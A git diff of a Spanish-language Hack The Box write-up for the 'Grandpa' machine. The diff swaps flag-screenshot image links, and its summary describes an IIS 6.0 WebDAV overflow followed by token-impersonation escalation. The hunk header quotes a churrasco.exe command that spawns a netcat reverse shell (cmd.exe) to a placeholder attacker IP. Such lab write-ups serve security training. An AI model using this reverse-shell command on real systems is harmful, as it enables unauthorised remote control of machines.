@@ -343,11 +343,11 @@ C:\Windows\Temp\churrasco.exe -d "C:\Windows\Temp\nc.exe -e cmd.exe TU_IP 5555"
 
 User.txt flag
 
-![image.png](%F0%9F%91%B4%20Grandpa%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%5D/image.png)
+![flags](https://github.com/2eevi/htb-writeups/blob/main/Grandpa/assets/image.png)
 
 root.txt
 
-![image.png](%F0%9F%91%B4%20Grandpa%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%5D/image%201.png)
+![flags](https://github.com/2eevi/htb-writeups/blob/main/Grandpa/assets/image1.png)
 
 La máquina Grandpa presenta una superficie de ataque crítica debido a la ejecución de software heredado (legacy). Se identificó un servidor IIS 6.0 vulnerable a un desbordamiento de búfer en el componente WebDAV, permitiendo la ejecución remota de código (RCE). Tras el acceso inicial, se abusó de privilegios de personificación de tokens para elevar privilegios a SYSTEM.
 
